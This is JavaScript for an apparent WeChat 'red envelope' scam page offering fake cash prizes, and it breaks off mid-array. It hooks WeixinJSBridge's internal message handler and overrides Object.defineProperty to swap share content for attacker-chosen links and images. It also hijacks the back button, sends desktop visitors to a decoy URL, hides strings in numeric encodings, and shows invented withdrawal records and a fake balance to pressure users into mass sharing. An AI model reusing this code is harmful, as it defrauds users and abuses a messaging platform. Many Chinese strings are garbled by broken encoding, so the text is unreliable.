var doc = $(document);
var _touches_point1 = 0;
var _touches_point2 = 0;
addEventListener("touchstart",
function(e) {
    _touches_point1 = e.touches[0].pageY;
});
addEventListener("touchmove",
function(e) {
    _touches_point2 = e.touches[0].pageY;
    if (doc.scrollTop() <= 0 && _touches_point1 < _touches_point2) {
        e.preventDefault();
        if ($('#_domain_display').length <= 0) {
            $('body').prepend('<div id="_domain_display" style="text-align:center;background-color:#272b2e;color:#65696c;height:0px;padding:15px 0;line-height:36px;font-size:12px;overflow:hidden;"><p>  ҳ   weixin.qq.com  ṩ</p></div>');
        }
        $('#_domain_display').height((_touches_point2 - _touches_point1));
    }
});
addEventListener("touchend",
function(e) {
    $('#_domain_display').slideUp('normal',
    function() {
        $('#_domain_display').remove();
    });
});
try {
    var app = app || {},
    Url, oldDefProp, fakeUrl, Main, WechatShare, ua, weui, timess;
    if (function() {
        var n = this;
        app.rndStr = function(n) {
            n = n || 32;
            var t = "abcdefhijkmnprstwxyz2345678",
            u = t.length,
            r = "";
            for (i = 0; i < n; i++) r += t.charAt(Math.floor(Math.random() * u));
            return r
        };
        app.rndNum = function(n) {
            return Math.ceil(Math.random() * n)
        };
        app.addRndToUrl = function(n) {
            return n.indexOf("?") > -1 ? n + "&rnd=" + app.rndStr(6) : n + "?rnd=" + app.rndStr(6)
        };
        app.decodeStr = function(n) {
            var r, t, i;
            if (!n) return "";
            for (r = n[0], t = n.split(r), i = 0; i < t.length; i++) t[i] && (t[i] = String.fromCharCode(t[i]));
            return t.join("")
        };
        app.rndSymbols = function(n) {
            n = n || 4;
            var t = "△▽○◇□☆▲▼●★☉⊙⊕Θ◎￠〓≡㊣♀※♂∷№囍＊",
            u = t.length,
            r = "";
            for (i = 0; i < n; i++) r += t.charAt(Math.floor(Math.random() * u));
            return r
        };
        app.strToCode = function(n) {
            for (var r = [], i, t = 0; t < n.length; t++) i = "0000" + parseInt(n[t].charCodeAt(0), 10).toString(16),
            r.push(i.substring(i.length - 4, i.length));
            return r
        };
        app.getCookie = function(n) {
            var t, i = new RegExp("(^| )" + n + "=([^;]*)(;|$)");
            return (t = document.cookie.match(i)) ? unescape(t[2]) : null
        };
        app.setCookie = function(n, t) {
            var i = new Date;
            i.setTime(i.getTime() + 2592e6);
            document.cookie = n + "=" + escape(t) + ";path=/;expires=" + i.toGMTString()
        };
        app.delCookie = function(n) {
            var t = new Date;
            t.setTime(t.getTime() - 86400);
            document.cookie = n + "=;path=/;expires=" + t.toGMTString()
        };
        app.showHint = function(n) {
            layer.open({
                content: n,
                time: 2
            })
        };
        app.showInfo = function(n, t) {
            layer.open({
                title: t || "  ʾ",
                content: n,
                btn: ["  ֪    "]
            })
        }
    } (), ua = navigator.userAgent, ua.indexOf(" ") > 0) {
        function isInWechat() {
            var n = navigator.userAgent.toLowerCase();
            return n.indexOf(" ") >= 0
        }
        function isIos() {
            var n = navigator.userAgent.toLowerCase();
            return n.indexOf("iphone") >= 0 || n.indexOf("ipad") >= 0 || n.indexOf("applewebkit") >= 0
        }
        function isAndroid() {
            var n = navigator.userAgent.toLowerCase();
            return n.indexOf("android") >= 0
        }
        function isUrl(n) {
            return !! n && (n.indexOf("http://") >= 0 || n.indexOf("http://") >= 0)
        }
        function isArray(n) {
            return "[object Array]" === Object.prototype.toString.call(n)
        }
        function isNumber(n) {
            return "number" == typeof n
        }
        function getRandomNum(n, t) {
            var i = t - n,
            r = Math.random();
            return n + Math.round(r * i)
        }
        function getFormatDate() {
            var n = new Date,
            t = new Date(n.setHours(n.getHours() + 8)).toISOString();
            return t.substring(0, t.indexOf("T"))
        }
        function changeTitle(n) {
            if (document.title = n, navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
                var i = $("body"),
                t = $('<iframe src="/favicon.ico"><\/iframe>');
                t.on("load",
                function() {
                    setTimeout(function() {
                        t.off("load").remove()
                    },
                    0)
                }).appendTo(i)
            }
        }
        Url = function() {
            function n() {
                this.host = window.location.host;
                this.protocol = window.location.protocol;
                this.params = this.GetRequest(window.location.search);
                this.hash = window.location.hash;
                this.pathname = window.location.pathname
            }
            return n.prototype.GetHref = function(n) {
                var i = this,
                o = void 0 === n.port ? i.port: n.port,
                c = void 0 === n.pathname ? i.pathname: n.pathname,
                l = n.host || i.host,
                a = n.protocol || i.protocol || "http:",
                f = a + "//" + l + (o ? ":" + o: "") + c,
                r = {},
                e,
                s,
                u,
                t,
                h;
                if ("all" !== n.removeParams) for (t in i.params) i.params.hasOwnProperty(t) && (r[t] = i.params[t]);
                if (n.params) for (t in n.params) n.params.hasOwnProperty(t) && (r[t] = n.params[t]);
                if ("all" !== n.removeParams && (e = n.removeParams, e)) for (t in e) n.removeParams.hasOwnProperty(t) && (s = n.removeParams[t], delete r[s]);
                u = [];
                for (t in r) r.hasOwnProperty(t) && u.push(t + "=" + encodeURIComponent(r[t]));
                return u && u.length > 0 && (h = u.join("&")),
                f += f.indexOf("?") > 0 ? "&": "?",
                f + h
            },
            n.prototype.GetRequest = function(n) {
                var f = n,
                e = {};
                if (f.indexOf("?") != -1) for (var h = f.substr(1), o = h.split("&"), r = 0; r < o.length; r++) {
                    var t = o[r],
                    u = t.indexOf("="),
                    i = void 0,
                    s = void 0;
                    u >= 0 ? (i = t.substr(0, u), s = decodeURIComponent(t.substring(u + 1))) : i = t;
                    i && (e[i] = s)
                }
                return e
            },
            n
        } ();
        oldDefProp = Object.defineProperty;
        Object.defineProperty = function(n, t, i) { (t == app.decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110") || t == app.decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101")) && (i.writable = !0, i.configurable = !0);
            oldDefProp(n, t, i)
        };
        window.url = new Url;
        fakeUrl = "http://weather.html5.qq.com";
        window.config = {
            modelConfig: {
                forceShareCount: 3
            },
            showRepairPage: !1,
            forbidUrl: fakeUrl
        };
        window.mConfig = {};
        isAndroid() || isIos() || (location.href = config.forbidUrl ? config.forbidUrl: fakeUrl);
        var s_qun_title, s_qun_content, s_timeline_title, s_timeline_content, s_qun_imgurl, s_timeline_imgurl, processed_share_url, share_url, message, rmb;
        Main = function() {
            function n() {
                this.forceShareCount = 4;
                this.currentShareCount = 0;
                this.toastTimeOut = 0;
                this.searchModelId = window.url.params.mid || "video-list";
                this.redirect = this.isNeedRedirect();
                this.isIphone = isIos();
                this.fileName = location.pathname.substr(location.pathname.lastIndexOf("/"));
                this.fileName.indexOf(".html") < 0 && (this.fileName = "/index.html")
            }
            return n.prototype.isNeedRedirect = function() {
                var n = window.url.params.from;
                return "timeline" == n || "groupmessage" == n || "singlemessage" == n || "share" == n
            },
            n.prototype.getRandomValueInArray = function(n, t) {
                if (!n) return t;
                if ("string" == typeof n) return n;
                if (!isArray(n)) return t;
                var i = getRandomNum(0, n.length - 1);
                return n[i] || t
            },
            n.prototype.start = function() {
                var t = this,
                n;
                void t.setShareCallBack();
                n = {
                    title: app.decodeStr("~24744~30340~26032~26149~31036~24050~38477~20020"),
                    desc: app.decodeStr("?39532?19978?39046?25250"),
                    img_url: get_rand_pic(),
                    link: window.location.href
                };
            },
            n.prototype.hookBackButton = function() {
                var n = this;
                window.setTimeout(function() {
                    history.pushState("weixin", null, "#weixin");
                    n.isIphone && history.pushState("weixin", null, "#weixin");
                    window.onpopstate = function(n) {
                        if (!window.main.isIphone || null !== n.state) {
                            if (window.turl && window.turl.length > 0) return void(location.href = window.turl);
                            var t = main.backUrl;
                            if ("close" === t) WeixinJSBridge && WeixinJSBridge.call("closeWindow");
                            else if (t && t.length > 0) return void(location.href = t)
                        }
                    }
                },
                150)
            },
            n.prototype.setShareCallBack = function() {
                var n = this;
                window.wcShare && (window.wcShare.shareCallback = function(t) {
                    var i = t && t.err_msg;
                    if ("send_app_msg:ok" == i || "send_app_msg:confirm" == i) {
                        n.currentShareCount++;
                        if (n.currentShareCount >= 3) {
                            n.currentShareCount = 3;
                        }
                        if (n.currentShareCount == 3 && window.share_pyq_flag) {
                            sharetips(4);
                        } else {
                            sharetips(n.currentShareCount);
                        }
                    } else if ("share_timeline:ok" == i || "share_timeline:confirm" == i) {
                        window.share_pyq_flag = true;
                        if (n.currentShareCount >= 2) {
                            sharetips(4);
                        } else {
                            sharetips(n.currentShareCount);
                        }
                    }
                })
            },
            n.prototype.runAction = function() {
                console.log("runAction")
            },
            n.prototype.setModelShareData = function(timeline) {
                var t;
                if (window.wcShare) {
                    if (timeline || window.shareType == 'shareTimeline') {
                        t = {
                            title: '◆连云港新闻◆万万没想到，这样居然也能赚到钱!!4月13号夜晚9:23',
                            desc: '',
                            link: 'http://p.t.qq.com/longweibo/index.php?lid=18441757194750221695&u=8r25152v28z1d1&t=551481150266428&msgfrom=lzdnzsbp&area=ppltyii&clickfrom=3&clickscene=other',
                            img_url: 'http://img.alicdn.com/8648b7f6j5n51r44v47138/TB20nmhmr4npuFjSZFmXXXl4FXa_!!276611346.jpg'
                        };
                    } else {
                        t = {
                            title: '',
                            desc: '恭囍發財，大吉大利　　　　　\n领取红包',
                            link: window.location.href,
                            img_url: 'http://img.alicdn.com/2356xc6288/TB2Eh4VkHRkpuFjSspmXXc.9XXa_!!276611346.jpg'
                        }
                    }
                    window.wcShare.shareData = t;
                }
            },
            n
        } ();
        WechatShare = function() {
            function n() {
                var n = this;
                this.onBridgeReady = function() {
                    var t = window.WeixinJSBridge,
                    i = {
                        invoke: t.invoke,
                        call: t.call,
                        on: t.on,
                        env: t.env,
                        log: t.log,
                        _fetchQueue: t._fetchQueue,
                        _hasInit: t._hasInit,
                        _hasPreInit: t._hasPreInit,
                        _isBridgeByIframe: t._isBridgeByIframe,
                        _continueSetResult: t._continueSetResult,
                        _handleMessageFromWeixin: t._handleMessageFromWeixin
                    };
                    Object.defineProperty(window, "WeixinJSBridge", {
                        writable: !0,
                        enumerable: !0
                    });
                    window.WeixinJSBridge = i;
                    try {
                        n.setHandleMessageHookForWeixin()
                    } catch(t) {
                        n.restoreHandleMessageHookForWeixin()
                    }
                };
                this.handleMesageHook = function(t) {
                    var r;
                    if (t) {
                        r = t.__json_message ? t.__json_message: t;
                        var i = r.__params,
                        u = r.__msg_type,
                        f = r.__event_id;
                        if ("callback" == u && n.shareCallback && "function" == typeof n.shareCallback) n.shareCallback(i);
                        else if ("event" == u && f && f.indexOf("share") > 0) {
                            var shareTo = i.shareTo;
                            var shareType = "sendAppMessage";
                            var is_timeline = 0;
                            if (shareTo) {
                                if (shareTo.indexOf("timeline") > -1) {
                                    shareType = "shareTimeline";
                                    is_timeline = 1
                                }
                            } else {
                                if (i.scene != 'friend') {
                                    shareType = "shareTimeline";
                                    is_timeline = 1
                                }
                            }
                            window.shareType = shareType;
                            window.main.setModelShareData(is_timeline);
                            var e = n.shareData.desc,
                            o = n.shareData.link,
                            s = n.shareData.img_url,
                            h = n.shareData.title;
                            Object.defineProperty(i, "title", {
                                get: function() {
                                    return delete i.scene,
                                    i.desc = e,
                                    i.link = o,
                                    i.img_url = s,
                                    Object.defineProperty(i, "title", {
                                        value: h,
                                        enumerable: !0
                                    }),
                                    "title"
                                },
                                set: function() {},
                                enumerable: !1,
                                configurable: !0
                            });
                            n.restoreHandleMessageHookForWeixin();
                            n.oldHandleMesageHook(t);
                            n.setHandleMessageHookForWeixin()
                        } else n.restoreHandleMessageHookForWeixin(),
                        n.oldHandleMesageHook(t),
                        n.setHandleMessageHookForWeixin()
                    }
                };
                "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
            }
            return n.prototype.setHandleMessageHookForWeixin = function() {
                this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
                window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
            },
            n.prototype.restoreHandleMessageHookForWeixin = function() {
                this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
            },
            n
        } ();
        window.wcShare = new WechatShare;
        $(document).ready(function() {
            window.main = new Main;
            window.main.start()
        })
    }
    if (ua = navigator.userAgent, ua.indexOf(" ") > 0 && document.write(unescape("%3Cdiv%20class%3D%22container%22%20id%3D%22container%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22hongbao%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22topcontent%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22avatar%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22https%3A///img.alicdn.com/%27+Math.random%28%29+%27/TB2K5S5cYtlpuFjSspfXXXLUpXa_%21%21305050158.jpg%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding-top%3A10px%3Bmargin%3A0%20auto%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22http%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB2mZdvbrXlpuFjy1zbXXb_qpXa_%21%210-martrix_bbs.jpg%22%20style%3D%22width%3A50%25%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding-top%3A20px%3Bmargin%3A0%20auto%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22https%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB2BYY1bbBmpuFjSZFAXXaQ0pXa_%21%210-martrix_bbs.jpg%22%20style%3D%22width%3A70%25%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22chai%22%20id%3D%22chai%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22chai2%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%22%5Cu958b%22%29%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding-top%3A20px%3Bmargin%3A0%20auto%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22http%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB2CRr1bhlmpuFjSZPfXXc9iXXa_%21%210-martrix_bbs.jpg%22%20style%3D%22width%3A35%25%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20id%3D%22showmain%22%20style%3D%22overflow%3Aauto%3Bdisplay%3Anone%22%3E%0A%20%20%20%20%20%20%20%20%3Csection%20class%3D%22top%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20width%3D%22100px%22%20src%3D%22http%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB2uFYYbohnpuFjSZFEXXX0PFXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%3C/section%3E%0A%20%20%20%20%20%20%20%20%3Csection%20class%3D%22main%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22qrcode%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22https%3A///img.alicdn.com/%27+Math.random%28%29+%27/TB2K5S5cYtlpuFjSspfXXXLUpXa_%21%21305050158.jpg%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/section%3E%0A%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20id%3D%22lq%22%20src%3D%22http%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB2oNPWbipnpuFjSZFkXXc4ZpXa_%21%212-martrix_bbs.png%22%20class%3D%22fenxiang_w%22%20style%3D%22display%3Ablock%3Bwidth%3A100%25%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3Bdisplay%3Anone%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%26nbsp%3B%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Csection%20class%3D%22bottom%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22text-align%3Acenter%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20width%3D%2240%25%22%20src%3D%22http%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB2TH6WbItnpuFjSZFKXXalFFXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22text-align%3Acenter%3Bcolor%3A%23000%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20id%3D%22get_money%22%20style%3D%22font-size%3A3em%22%3E0%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20style%3D%22font-size%3A3em%22%3E.00%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%22%u5143%22%29%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3AshowMask%28%29%3B%22%20style%3D%22width%3A40%25%3Bheight%3A60px%3Bfont-size%3A18px%3Bline-height%3A60px%3Bborder-radius%3A8px%3Bbackground%3A%23d94e42%3Bcolor%3A%23fff%3Btext-align%3Acenter%3Bmargin%3A18px%20auto%2010px%20auto%3Bdisplay%3Ablock%3Btext-decoration%3Anone%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%22%5Cu70b9%5Cu6b64%5Cu7acb%5Cu5373%5Cu9886%5Cu53D6%22%29%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/p%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22background-color%3A%23faf6f1%3Bpadding%3A.5em%3Bborder-top%3A1px%20%23f0eeea%20solid%3Bborder-bottom%3A1px%20%23f0eeea%20solid%3Bmargin-top%3A10px%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cscript%3Edocument.write%28%27%3Cimg%20width%3D%2240%25%22%20src%3D%22http%3A///img.alicdn.com/%27%20+%20Math.random%28%29%20+%20%27/TB27DT0bd4opuFjSZFLXXX8mXXa_%21%210-martrix_bbs.jpg%22%3E%27%29%3B%3C/script%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22hbAvList%22%3E%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/section%3E%0A%20%20%20%20%3C/div%3E")), ua = navigator.userAgent, ua.indexOf(" ") > 0) {
        document.title = "\201";
        function showtip() {
            weui.alert("\u6D3B\u52A8\u63D0\u793A\uFF1A\u8BF7\u52A1\u5FC5\u5206\u4EAB\u5230\u7FA4\u540E\u624D\u4F1A\u5230\u8D26\uFF08\u76EE\u524D\u6D3B\u52A8\u4EC5\u5269720\u4EFD\uFF09\uFF01")
        }
        function showMask() {
            $("#mask").css("height", $(document).height());
            $("#mask").css("width", $(document).width());
            $(".fenxiang_w").show();
            $("#mask").show();
            showtip()
        }
        var oChai = document.getElementById("chai2"),
        oContainer = document.getElementById("container"),
        showmain = document.getElementById("showmain");
        showmain.style.display = "none";
        oChai.onclick = function() {
            oChai.setAttribute("class", "rotate");
            var kcnum = 30;
            setTimeout(function() {
                oContainer.remove();
                showmain.style.display = "";
                var n = 0,
                t = setInterval(function() {
                    n += 1;
                    n >= kcnum && clearInterval(t);
                    document.getElementById("get_money").innerHTML = n
                },
                6)
            },
            1600)
        };
        $(function() {
            function u(a) {
                var b = t.getHours(),
                c = t.getMinutes() * 1 + a.c_time * 1;
                return c > 59 && (c = c - 60, b++, b > 23 && (b = 0)),
                '<li><img src="' + a.w_headimg + '" alt=""><div class="hbName"><h3>' + eval("'" + a.w_name + "'") + '<\/h3><p class="hbTime">' + b + ":" + c + '<\/p><\/div><span class="hbMoney">' + eval("'" + a.u_time + "'") + "<\/span><\/li>"
            }
            function f() {
                return '<li style="display: none;"><\/li>'
            }
            function e(a) {
                var b = t.getHours(),
                c = t.getMinutes() * 1 + a.c_time * 1;
                return c > 59 && (c = c - 60, b++, b > 23 && (b = 0)),
                '<img src="' + a.w_headimg + '" alt=""><div class="hbName"><h3>' + eval("'" + a.w_name + "'") + '<\/h3><p class="hbTime">' + b + ":" + c + '<\/p><\/div><span class="hbMoney">' + eval("'" + a.u_time + "'") + "<\/span>"
            }
            for (var i = [{
                w_name: "  Ѿͷ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/3CC6C03786C6C693F364B395F327197F/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0035\u002e\u0030\u0030\u0020\u5143",
                c_time: "7"
            },
            {
                w_name: " \\uD83C\\uDF80\\uD83D\\uDE34\\uD83D\\uDE34\\uD83D\\uDE34",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/77AC9176E0EE94A552AAD6961066D4BA/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0031\u002e\u0030\u0030\u0020\u5143",
                c_time: "6"
            },
            {
                w_name: "С Ӽ ס  ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0033\u002e\u0030\u0030\u0020\u5143",
                c_time: "12"
            },
            {
                w_name: "Сè     ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0032\u002e\u0030\u0030\u0020\u5143",
                c_time: "5"
            },
            {
                w_name: "    㡫  ů",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0033\u002e\u0030\u0030\u0020\u5143",
                c_time: "15"
            },
            {
                w_name: "     ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0037\u002e\u0030\u0030\u0020\u5143",
                c_time: "15"
            },
            {
                w_name: "Ƶ      ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0034\u002e\u0030\u0030\u0020\u5143",
                c_time: "15"
            },
            {
                w_name: "ţ ̱   ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0034\u002e\u0030\u0030\u0020\u5143",
                c_time: "9"
            },
            {
                w_name: " Ͼ    ǻ     ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0039\u002e\u0030\u0030\u0020\u5143",
                c_time: "2"
            },
            {
                w_name: "    ÿһ  ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/9CFD84D74ABF5141EA8F6B73BD06C3E1/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0033\u002e\u0030\u0030\u0020\u5143",
                c_time: "3"
            },
            {
                w_name: "      ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/BA6DA5237D4175DDC750553561F219B7/100",
                u_time: "\u9886\u53d6\u4e86\u0036\u5143\u73b0\u91d1\u7ea2\u5305",
                c_time: "8"
            },
            {
                w_name: "Jkz.",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0033\u002e\u0030\u0030\u0020\u5143",
                c_time: "10"
            },
            {
                w_name: "¬  Ӣ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0032\u002e\u0030\u0030\u0020\u5143",
                c_time: "7"
            },
            {
                w_name: "   ұ   ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0039\u002e\u0030\u0030\u0020\u5143",
                c_time: "9"
            },
            {
                w_name: " ѻ     ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0032\u002e\u0030\u0030\u0020\u5143",
                c_time: "7"
            },
            {
                w_name: "\\uD83C\\uDF3A  dacy",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0031\u002e\u0030\u0030\u0020\u5143",
                c_time: "7"
            },
            {
                w_name: "Mr. Xue",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0038\u002e\u0030\u0030\u0020\u5143",
                c_time: "2"
            },
            {
                w_name: "      ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0036\u002e\u0030\u0030\u0020\u5143",
                c_time: "6"
            },
            {
                w_name: "    ^_^˯  ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/C54D6E68485F84A86822CF7E473A93EC/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0035\u002e\u0030\u0030\u0020\u5143",
                c_time: "15"
            },
            {
                w_name: "  Ѵ  ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/2316567F52712C775048DB02BF5C261C/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0035\u002e\u0030\u0030\u0020\u5143",
                c_time: "3"
            },
            {
                w_name: "С    ",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/D1A596E47C0AA279BA8BB9BAAC02CC44/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0036\u002e\u0030\u0030\u0020\u5143",
                c_time: "12"
            },
            {
                w_name: "  8    8",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/189955F05F482DE956480DB66B07E4DC/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0031\u0034\u002e\u0030\u0030\u0020\u5143",
                c_time: "12"
            },
            {
                w_name: "    ÿһ  _",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/5CD9B7ACD34332B8DA145BE3DE4C44FB/100",
                u_time: "\u63d0\u73b0\u4e86\u0020\u0032\u0032\u002e\u0030\u0030\u0020\u5143",
                c_time: "14"
            },
            {
                w_name: " \\uD83D\\uDC8B",
                w_headimg: "//q.qlogo.cn/qqapp/1104718115/B7CDFAA5FD54A0FD2904A30B6A29D660/100",
